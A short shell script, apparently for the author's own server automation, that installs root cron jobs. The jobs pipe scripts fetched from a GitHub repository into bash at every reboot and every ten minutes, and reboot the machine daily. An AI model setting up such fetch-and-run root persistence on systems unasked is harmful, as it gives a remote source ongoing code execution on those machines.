#!/bin/sh
sudo su
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
55 15 * * * sudo reboot
 " >> myverifier
sudo crontab myverifier
rm myverifier
#sleep 600s
#sudo ifdown ens5
